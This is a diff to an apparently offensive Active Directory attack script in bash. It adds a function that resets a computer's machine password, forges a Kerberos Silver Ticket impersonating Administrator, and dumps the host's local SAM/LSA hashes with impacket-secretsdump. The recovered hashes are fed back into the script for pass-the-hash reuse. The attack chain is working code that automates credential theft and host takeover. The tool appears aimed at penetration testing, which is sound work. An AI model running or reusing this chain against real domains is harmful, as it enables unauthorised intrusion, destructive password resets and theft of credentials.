@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.9"
+readonly VERSION="1.50.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -205,6 +205,7 @@ declare -A REQUEUED_SELF=()       # "user|group" (lc) re-assessed after a self-g
 declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
+declare -A COMP_SILVER_DONE=()    # computer (lc) → takeover-via-silver-ticket already attempted
 declare -A ADIDNS_DONE=()         # ADIDNS records already attempted/created in this run
 declare -A BADSUCCESSOR_DONE=()   # OU (lc) → BadSuccessor (dMSA succession) already attempted
 BADSUCCESSOR_FAC_USER=""          # an owned identity that can MINT dMSAs (BadSuccessor "factory")
@@ -4068,12 +4069,8 @@ _abuse_rbcd() {
     # INVALID_PARAMETER. Don't pretend it worked; point at the computer-takeover route.
     if grep -qiE 'noSuchAttribute|INVALID_PARAMETER|will not perform|unwilling|not supported' <<<"$rbout"; then
         warn "  RBCD unsupported on this DC (pre-2012 / Server 2008 R2 has no msDS-AllowedToActOnBehalfOfOtherIdentity)."
-        info "  → leverage FullControl over ${target} via COMPUTER TAKEOVER (reset its password → Silver Ticket → Administrator):"
-        detail "      bloodyAD ${ba[*]} set password '$target' 'MachinePwn123!'   # FullControl can set a computer's pw"
-        detail "      NT=\$(python3 -c \"import hashlib;print(hashlib.new('md4','MachinePwn123!'.encode('utf-16le')).hexdigest())\")"
-        detail "      SID=\$(bloodyAD ${ba[*]} get object '$DOMAIN' --attr objectSid | grep -oP 'S-1-5-21-[0-9-]+')"
-        detail "      impacket-ticketer -nthash \$NT -domain-sid \$SID -domain $DOMAIN -spn cifs/${target%\$}.${DOMAIN} Administrator"
-        detail "      KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass ${target%\$}.${DOMAIN}   # or wmiexec / RDP → RpcEptMapper → SYSTEM"
+        info  "  → falling back to COMPUTER TAKEOVER (reset password → Silver Ticket → Administrator → SYSTEM)"
+        _abuse_computer_silver "$target" && return 0
         return 1
     fi
     rb_record "Set RBCD on $target → $deleg" "bloodyAD ${ba[*]} remove rbcd '$target' '$deleg'"
@@ -4094,6 +4091,68 @@ _abuse_rbcd() {
         return 0
     fi
     warn "RBCD did not produce a usable ticket for $target"; return 1
+}
+
+# Computer takeover via Silver Ticket — the pre-2012/2008R2 leverage for write-control
+# over a COMPUTER when RBCD (no attr) and Shadow Creds (no PKINIT) don't exist: reset
+# the machine's password (so we know its NT hash) → forge a Silver Ticket for a service
+# on that host impersonating a local admin → psexec runs as SYSTEM. Rollback-tracked.
+# Needs the reset right (GenericAll/FullControl); GenericWrite-only will fail the reset.
+_abuse_computer_silver() {
+    local target="$1"            # COMPUTER$ we control
+    [[ "$DO_ABUSE" != "1" ]] && return 1
+    [[ "$target" != *\$ ]] && return 1
+    have impacket-ticketer || { warn "  impacket-ticketer missing → can't forge a silver ticket"; return 1; }
+    local ba; mapfile -t ba < <(bloody_args)
+    local host="${target%\$}" newpw="Ad4Pwn_C0mp_99"
+    [[ -n "${COMP_SILVER_DONE[${target,,}]:-}" ]] && return 1
+    COMP_SILVER_DONE["${target,,}"]=1
+
+    # domain SID = the target's objectSid minus its RID
+    local tsid dsid
+    tsid=$(bloodyAD "${ba[@]}" get object "$target" --attr objectSid 2>/dev/null | grep -oiE 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+' | head -1)
+    [[ -n "$tsid" ]] && dsid="${tsid%-*}"
+    [[ -z "$dsid" ]] && dsid=$(bloodyAD "${ba[@]}" get object "$DOMAIN" --attr objectSid 2>/dev/null | grep -oiE 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+' | head -1)
+    [[ -z "$dsid" ]] && { warn "  could not resolve the domain SID → silver ticket aborted"; return 1; }
+
+    abuse_confirm "  Take over ${target} (reset its machine password — DESTRUCTIVE to the host — and forge a Silver Ticket)?" || return 1
+    run "bloodyAD ${ba[*]} set password '$target' '<machine-pw>'"
+    if ! bloodyAD "${ba[@]}" set password "$target" "$newpw" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed|modif'; then
+        warn "  couldn't reset ${target}'s password (need GenericAll/Reset right; GenericWrite alone can't) → silver ticket aborted"
+        return 1
+    fi
+    rb_record "Reset machine password of $target" "echo 'Manual: $target machine password was reset — reset/rejoin the host to restore trust'"
+    loot "★ Reset ${C_BOLD}${target}${C_RESET} machine password → we now own its Kerberos keys"
+
+    local nt; nt=$(python3 -c 'from impacket.ntlm import compute_nthash;import sys;print(compute_nthash(sys.argv[1]).hex())' "$newpw" 2>/dev/null)
+    [[ ! "$nt" =~ ^[0-9a-fA-F]{32}$ ]] && { warn "  could not compute NT hash → abort"; return 1; }
+    local imp="${SILVER_IMPERSONATE:-Administrator}" cc="$OUTDIR/silver_${host}.ccache" won=0 spn
+    for spn in "cifs/${host}.${DOMAIN}" "host/${host}.${DOMAIN}" "http/${host}.${DOMAIN}"; do
+        run "impacket-ticketer -nthash $nt -domain-sid $dsid -domain $DOMAIN -spn $spn $imp"
+        rm -f "${imp}.ccache"
+        if impacket-ticketer -nthash "$nt" -domain-sid "$dsid" -domain "$DOMAIN" -spn "$spn" "$imp" >>"$LOGFILE" 2>&1 && [[ -f "${imp}.ccache" ]]; then
+            mv -f "${imp}.ccache" "$cc"; won=1
+            loot "★ Silver ticket forged → ${C_BOLD}${imp}@${host}${C_RESET} (${spn}) → $(basename "$cc")"
+            break
+        fi
+    done
+    [[ "$won" != "1" ]] && { warn "  impacket-ticketer failed for $target"; return 1; }
+    note_cred_source "${imp}@${host}" "Silver ticket (computer takeover of $target)"
+    loot "  → KRB5CCNAME=$cc impacket-psexec -k -no-pass ${host}.${DOMAIN}   (SYSTEM shell; or wmiexec/smbexec — RpcEptMapper not even needed)"
+
+    # Convert it now: dump the host's local secrets (SAM/LSA) via the ticket.
+    if have impacket-secretsdump; then
+        subsection "Silver ticket → local secrets of ${host}"
+        local sd; sd=$(KRB5CCNAME="$cc" impacket-secretsdump -k -no-pass "${host}.${DOMAIN}" 2>&1); echo "$sd" >>"$LOGFILE"
+        printf '%s\n' "$sd" | grep -iE '^[^:]+:[0-9]+:[a-f0-9]{32}:[a-f0-9]{32}:::' | tee -a "$OUTDIR/silver_${host}_secrets.txt" | head -20
+        # feed recovered local-admin hashes back into the engine (PtH elsewhere / reuse)
+        while IFS= read -r line; do
+            local u nth; u="${line%%:*}"; nth=$(awk -F: '{print $4}' <<<"$line")
+            [[ -n "$u" && "$nth" =~ ^[a-f0-9]{32}$ ]] && { note_cred_source "$u" "SAM of $host (silver ticket)"; queue_cred "$u" "" "$nth" "local SAM via silver ticket ($host)"; }
+        done < <(printf '%s\n' "$sd" | grep -iE '^[^:]+:[0-9]+:[a-f0-9]{32}:[a-f0-9]{32}:::')
+        [[ -s "$OUTDIR/silver_${host}_secrets.txt" ]] && loot "★ Dumped local SAM/LSA of ${host} → silver_${host}_secrets.txt"
+    fi
+    return 0
 }
 
 # Targeted Kerberoast via WriteSPN: set a temp SPN, roast, then remove it
